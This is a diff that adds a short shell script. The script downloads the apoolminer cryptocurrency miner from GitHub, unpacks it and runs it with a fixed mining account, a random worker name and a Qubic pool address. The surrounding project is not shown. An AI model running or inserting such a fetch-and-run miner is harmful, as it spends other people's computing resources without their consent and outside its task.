@@ -1,0 +1,4 @@
+curl https://github.com/apool-io/apoolminer/releases/download/v3.3.0/apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz -L -o apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz
+tar xf apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz
+cd apoolminer_linux_qubic_autoupdate_v3.3.0
+./apoolminer --account CP_jf0ixh8hgm --gpu-off --worker $(echo $RANDOM | md5sum | head -c 10) --pool qubic1.hk.apool.io:3334
